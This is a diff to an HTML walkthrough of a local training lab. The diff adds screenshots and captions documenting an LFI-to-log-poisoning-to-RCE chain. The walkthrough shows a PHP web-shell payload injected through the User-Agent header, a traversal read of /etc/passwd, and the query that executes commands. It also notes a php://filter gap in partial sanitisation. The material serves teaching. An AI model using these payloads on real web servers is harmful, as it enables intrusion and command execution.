@@ -101,9 +101,21 @@ docker compose up -d --build       # target at http://localhost:5000</code></pre
         <li>Poison via Repeater: <code>User-Agent: &lt;?php system($_GET['cmd']); ?&gt;</code> sent to <code>/</code>, then re-read the log to confirm the payload landed unencoded.</li>
         <li>Trigger RCE: <code>?search=logs/access.log&amp;cmd=id</code> → <code>uid=33(www-data) gid=33(www-data)</code> embedded in the page. That output is the lab's proof/flag.</li>
       </ol>
+      <figure class="shot">
+        <img src="../assets/airt-lab5/01-lfi-etc-passwd.png" alt="LFI confirmed by reading /etc/passwd through the search parameter" />
+        <figcaption>Figure 1 — LFI confirmed: <code>?search=../../../../etc/passwd</code> returns the container's passwd file.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="../assets/airt-lab5/02-lfi-log-read.png" alt="Reading the Apache access log through the LFI, showing the poisoned User-Agent entry" />
+        <figcaption>Figure 2 — The poisoned log read back through the LFI: the PHP payload landed in <code>logs/access.log</code> via the User-Agent header, unencoded.</figcaption>
+      </figure>
+      <figure class="shot">
+        <img src="../assets/airt-lab5/03-rce-cmd-id.png" alt="RCE output showing uid=33(www-data) after including the poisoned log with cmd=id" />
+        <figcaption>Figure 3 — RCE: <code>?search=logs/access.log&amp;cmd=id</code> executes the planted PHP — <code>uid=33(www-data)</code>. Chain complete.</figcaption>
+      </figure>
       <p>
         Note: the shipped <code>access.log</code> is pre-poisoned so the demo always works — still perform
-        perform the poisoning step themselves. Also <code>index.php</code>'s <code>basename()</code> blocks traversal
+        the poisoning step yourself. Also <code>index.php</code>'s <code>basename()</code> blocks traversal
         in <code>page=</code> but explicitly passes <code>php://filter</code> through — a lesson in partial sanitization.
       </p>
 
